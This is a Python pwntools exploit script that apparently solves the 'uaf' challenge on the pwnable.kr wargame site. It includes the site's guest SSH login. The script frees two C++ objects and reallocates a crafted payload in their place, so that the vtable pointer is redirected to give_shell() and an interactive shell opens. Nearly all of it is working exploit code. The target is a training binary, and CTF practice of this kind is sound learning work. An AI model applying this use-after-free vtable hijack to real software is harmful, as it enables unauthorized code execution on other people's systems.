#!/usr/bin/env python3

from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(payload):
    
    # usage: <payload_size> <payload_file>
    argv = [str(len(payload))]

    # Connect to remote server
    if args.REMOTE:
        conn = ssh(host='pwnable.kr', user='uaf', port=2222, password='guest')
        conn.process(copy_command, shell=True)
        argv.append('/tmp/exploit.txt')
        return conn.process(['./uaf'] + argv)
    
    with open('exploit.txt', 'wb') as f:
            f.write(payload)
    argv.append('exploit.txt')

    # debug locally with GDB
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
      
    # run locally
    else:
        return process([exe] + argv)

# Specify your GDB script here for debugging
# 0x400fcd: introduce

gdbscript = '''
b *0x400fcd
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './uaf'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
#context.log_level = 'debug'

# ===========================================================
#                    START OF EXPLOIT
# ===========================================================

# Payload to overwrite the vtable pointer in UAF attack
GIVE_SHELL = 0x401570 # (vtable for Man+16) -> give_shell()
payload = flat(
        p32(GIVE_SHELL-8)
        )

# Create the exploit.txt file
copy_command = 'python -c "import struct;import sys;\
        sys.stdout.write(struct.pack(' + "'Q'" + f', {GIVE_SHELL-8}))"\
        > /tmp/exploit.txt'

# Start the process or connect remotely
io = start(payload)
log.info("Created exploit.txt file...")

def call_introduce():
    """ Calls the introduce function, which should be overwritten
        to point to give_shell()
    """
    io.sendlineafter(b'3. free\n', b'1')

def allocate_payload():
    """ Writes the payload in the same memory location where UAF object
        was allocated.
    """
    io.sendlineafter(b'3. free\n', b'2')

def free_uaf():
    """ Frees the UAF object, adding it to tcache bin.
    """
    io.sendlineafter(b'3. free\n', b'3')

# Free m and w
log.info("Freeing m and w objects...")
free_uaf()

# grab w from tcache bin
log.info("Allocating payload in the same memory location as w...")
allocate_payload()

# grab m from tcache bin
log.info("Allocating payload in the same memory location as m...")
allocate_payload()

# call the overwritten introduce function
log.info("Calling introduce function (popping shell)...")
call_introduce()

# pop a shell
io.interactive()
io.close()
